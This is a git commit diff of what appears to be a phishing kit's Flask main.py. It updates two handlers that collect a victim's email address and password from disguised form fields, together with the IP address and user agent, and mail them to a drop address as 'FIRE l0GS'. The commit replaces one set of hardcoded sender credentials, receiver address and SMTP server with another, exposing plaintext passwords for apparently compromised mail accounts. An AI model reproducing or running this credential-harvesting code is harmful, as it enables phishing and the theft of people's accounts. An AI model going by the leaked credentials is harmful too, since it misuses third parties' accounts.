67c4f413403e47d842825fe07bdc1e6998382ac8
kimexairsea <koa.kimexairsea@gmail.com>
2026-04-08 19:11:42 +0800

    Update main.py

--- main.py
+++ main.py
@@ -446,10 +446,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'hassansheikh@elliottwave-forecast.com'
-        sender_emaill = 'hassansheikh'
-        receiver_email = 'jinna2323@yandex.com'
-        password = 'L@hore789'
+        sender_email = 'apskaita@zirginelis.lt'
+        sender_emaill = 'apskaita'
+        receiver_email = 'valsorin593@gmail.com'
+        password = 'Cc1pqx5E!'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -468,7 +468,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('elliottwave-forecast.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.zirginelis.lt', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -487,10 +487,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'hassansheikh@elliottwave-forecast.com'
-        sender_emaill = 'hassansheikh'
-        receiver_email = 'jinna2323@yandex.com'
-        password = 'L@hore789'
+        sender_email = 'apskaita@zirginelis.lt'
+        sender_emaill = 'apskaita'
+        receiver_email = 'valsorin593@gmail.com'
+        password = 'Cc1pqx5E!'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -509,7 +509,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('elliottwave-forecast.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.zirginelis.lt', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
